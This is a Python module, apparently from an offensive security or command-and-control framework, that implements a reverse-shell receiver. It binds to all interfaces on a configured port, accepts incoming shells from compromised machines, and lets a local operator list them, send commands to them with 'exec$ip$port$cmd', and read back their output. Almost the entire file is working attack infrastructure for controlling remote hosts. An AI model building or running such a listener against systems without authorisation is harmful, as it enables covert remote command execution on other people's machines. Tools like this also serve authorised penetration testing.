#!/usr/bin/env python3
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.
"""
Handle reverse shell coming from the other users.

Interaction with the various shells can come from localhost, i.e. a user connecting to the port on
localhost can run commands on the shells.
"""

import logging
import socket
import threading
import time
import os
import sys

from lib import ipc
from lib.constants import *

logger = logging.getLogger(__name__)

class ShellConnection:
    def __init__(self, socket, client):
        self.clientsocket = socket
        self.client = client
        self.received = b""
        self.archived = b""

    def run(self):
        logger.info("Ran shellconnection")
        while True:
            try:
                data = self.clientsocket.recv(2048)
                self.received += data
            except OSError as e:
                logger.warning("Socket receive error: {}".format(e))
                return

            if len(data) != 0:
                logger.debug("Received '{}'".format(data))
            else:
                logger.debug("Client {} closed connection".format(self.client))
                return

    def send(self, data):
        """ Send data (command) to client. """
        self.clientsocket.send(data)
        if data.strip() == b"exit":
            logger.info("Closing shell {}:{}".format(self.client[0], self.client[1]))
            self.clientsocket.shutdown(socket.SHUT_RDWR)
            self.clientsocket.close()

    def get_data(self):
        """ Get last data that was received and mark data as read. """
        ret = self.received
        if ret == b"":
            return b"\n"
        self.archived += self.received
        self.received = b""
        return ret


class ShellReceiver:
    def __init__(self):
        # Get which port we should listen to
        response = ipc.sync_http_raw("GET", SOCK_CONFIG, "/get/variable/Options/LPORT")
        ipc.assert_response_valid(response, dict)
        assert "LPORT" in response["text"]
        try:
            self.port = int(response["text"]["LPORT"])
        except:
            logger.critical("Unable to convert LPORT to in")
            sys.exit(0)

        self.socket = None
        self.unix_socket = None
        self.workers = []

    def run(self):
        logger.info("starting receiver on {}:{}".format("0.0.0.0", self.port))
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(("0.0.0.0", self.port))
        self.socket.listen(5)
        while True:
            (clientsocket, address) = self.socket.accept()
            logger.info("Received connection from {}".format(address))
            if address[0] == "127.0.0.1":
                logger.info("Receiving on localhost")
                if self.receive_localhost(clientsocket) is False:
                    self.close_sockets()
                    self.socket.close()
                    return
                else:
                    continue

            shell = ShellConnection(clientsocket, address)
            newthread = threading.Thread(target=shell.run)

            self.workers.append({
                "thread": newthread,
                "object": shell,
                "ip": address[0],
                "port": address[1]
            })
            newthread.start()

    def close_sockets(self):
        logger.info("Closing all sockets")
        for worker in self.workers:
            if worker["thread"].isAlive():
                worker["object"].send(b"exit\n")
        self.workers = []

    def find_worker(self, ip, port):
        for worker in self.workers:
            if worker["ip"] == ip and worker["port"] == port:
                return worker
        return None

    def command2packet(self, cmd):
        parts = cmd.split("$")
        if len(parts) >= 3:
            ins = parts[0]
            ip = parts[1]
            try:
                port = int(parts[2])
            except:
                logger.warning("Unable to convert {} to int".format(parts[2]))
                return None
            command = "$".join(parts[3:])
            return {"instruction": ins, "ip": ip, "port": port, "cmd": command}
        return None


    def handle_command(self, cmd):
        if cmd == "exit":
            return (b"", False)
        elif cmd.startswith("exec$"):
            parts = cmd.split("$")
            if len(parts) >= 4:
                ip = parts[1]
                try:
                    port = int(parts[2])
                except:
                    logger.warning("Unable to convert {} to int".format(parts[2]))
                    return (b"Invalid command", True)
                command = "$".join(parts[3:])
                worker = self.find_worker(ip, port)
                if worker == None:
                    return (b"Client not found\n", True)
                worker["object"].send(command.encode() + b"\n")
                return (b"OK\n", True)
        elif cmd.startswith("get$"):
            packet = self.command2packet(cmd)
            if packet != None:
                worker = self.find_worker(packet["ip"], packet["port"])
                if worker != None:
                    data = worker["object"].get_data()
                    return (data, True)
                else:
                    return (b"Client not found\n", True)
            else:
                return (b"Invalid packet\n", True)

        elif cmd == "list":
            ret = "ip,port\n"
            for worker in self.workers:
                if worker["thread"].isAlive():
                    ret += "{}${}\n".format(worker["ip"], worker["port"])
            return (ret.encode(), True)

        return (b"Not a valid command\n", True)


    def receive_localhost(self, clientsocket):
        try:
            data = clientsocket.recv(256)
        except OSError as e:
            logger.warning("Socket receive error: {}".format(e))
            return False

        if len(data) != 0:
            logger.debug("Received '{}'".format(data))
            (response, close) = self.handle_command(data.strip().decode())
            clientsocket.send(response)
            clientsocket.close()
            return close
        else:
            logger.debug("Client {} closed connection".format(self.client))
        return True
